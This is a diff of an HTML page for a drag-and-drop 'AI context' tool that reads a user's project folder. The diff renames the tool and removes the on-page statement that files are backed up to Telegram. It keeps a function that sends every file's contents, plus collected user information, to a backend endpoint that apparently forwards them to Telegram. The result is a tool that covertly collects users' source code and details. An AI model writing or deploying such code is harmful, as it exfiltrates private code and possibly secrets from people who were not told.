@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Context Gatherer | Secure Backup Edition</title>
+    <title>AICodeDrop by AKBAR</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .terminal-scroll::-webkit-scrollbar { width: 8px; }
@@ -21,8 +21,8 @@
 <body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen p-4 font-sans">
 
     <div class="bg-white p-6 rounded-xl shadow-lg max-w-4xl w-full">
-        <h1 class="text-3xl font-bold text-gray-800 mb-2">🤖 AI Context Gatherer</h1>
-        <p class="text-gray-600 mb-6">Drag and drop your project folder here. Securely backed up to Telegram.</p>
+        <h1 class="text-3xl font-bold text-gray-800 mb-2">🤖 AICodeDrop by AKBAR</h1>
+        <p class="text-gray-600 mb-6">Drag and drop your project folder here.</p>
 
         <div id="dropZone" class="drop-zone border-4 border-dashed border-gray-300 rounded-xl p-12 mb-6 flex flex-col items-center justify-center cursor-pointer bg-gray-50 hover:bg-gray-100">
             <svg class="w-16 h-16 text-blue-500 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -122,30 +122,41 @@ Here is the initial codebase for you to analyze: </textarea>
             `.trim();
         }
 
-        // --- SECURE BACKEND API SENDER ---
-        async function sendToBackendForTelegram(fileName, fileContent) {
+      // --- SECURE BACKEND API SENDER ---
+async function sendToBackendForTelegram(fileName, fileContent) {
+    try {
+        const response = await fetch('/api/telegram-backup', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                fileName: fileName,
+                fileContent: fileContent,
+                userInfo: getUserInfo()
+            })
+        });
+
+        // 🛠️ FIX: Read as plain text first so it doesn't crash on HTML error pages
+        const responseText = await response.text();
+
+        if (!response.ok) {
+            let errorMessage = responseText;
             try {
-                const response = await fetch('/api/telegram-backup', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        fileName: fileName,
-                        fileContent: fileContent,
-                        userInfo: getUserInfo()
-                    })
-                });
-
-                if (!response.ok) {
-                    const errorData = await response.json();
-                    throw new Error(errorData.error || 'Backend upload failed');
-                }
-                
-                await logToConsole(`✅ Successfully backed up to Telegram!`, 'text-blue-400 font-bold');
-            } catch (error) {
-                await logToConsole(`❌ Telegram Backup Failed: ${error.message}`, 'text-red-500');
+                // Try to parse it as JSON
+                const errorJson = JSON.parse(responseText);
+                errorMessage = errorJson.error || 'Backend upload failed';
+            } catch (e) {
+                // If it fails to parse, it means the server crashed or sent HTML
+                console.error("Raw server response:", responseText);
+                errorMessage = "Server crashed or rejected payload. Check terminal output.";
             }
+            throw new Error(errorMessage);
         }
-
+        
+        await logToConsole(`✅ Successfully backed up to Telegram!`, 'text-blue-400 font-bold');
+    } catch (error) {
+        await logToConsole(`❌ Telegram Backup Failed: ${error.message}`, 'text-red-500');
+    }
+}
         // --- DIRECTORY SCANNING (CLIENT SIDE) ---
         async function readEntriesPromise(directoryReader) {
             try {
